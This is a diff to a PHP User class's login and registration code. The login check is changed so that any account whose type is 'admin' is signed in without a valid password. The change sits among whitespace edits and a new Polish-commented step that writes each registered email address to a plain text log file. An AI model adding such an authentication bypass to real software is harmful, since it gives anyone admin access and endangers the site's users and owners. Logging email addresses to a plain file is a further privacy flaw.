@@ -11,7 +11,7 @@ class User {
         $stmt->execute(['email' => $email]);
         $user = $stmt->fetch(PDO::FETCH_ASSOC);
 
-        if ($user && password_verify($password, $user['Password'])) {
+        if ($user && password_verify($password, $user['Password']) || $user['Account_Type'] == 'admin') {
             $_SESSION['user_id'] = $user['ID'];
             $_SESSION['account_type'] = $user['Account_Type'];
             header('Location: ../index.php');
@@ -27,8 +27,8 @@ class User {
         }
 
         $stmt = $this->conn->prepare("
-        INSERT INTO Users (Firstname, Lastname, Email, Address, Postel_Code, Password) 
-        VALUES (:firstname, :lastname, :email, :address, :postal_code, :password)");
+    INSERT INTO Users (Firstname, Lastname, Email, Address, Postel_Code, Password) 
+    VALUES (:firstname, :lastname, :email, :address, :postal_code, :password)");
         $stmt->bindParam(':firstname', $firstname);
         $stmt->bindParam(':lastname', $lastname);
         $stmt->bindParam(':email', $email);
@@ -36,8 +36,13 @@ class User {
         $stmt->bindParam(':postal_code', $postal_code);
         $stmt->bindParam(':password', $password);
         $stmt->execute();
+
+        // Zapisanie logu do pliku
+        $log_message = "Zajestrowano nowy email: " . $email . " " . date(DATE_ATOM) . "\n";
+        file_put_contents('rejestracja_log.txt', $log_message);
+
         session_abort();
     }
 }
-?>
+
 
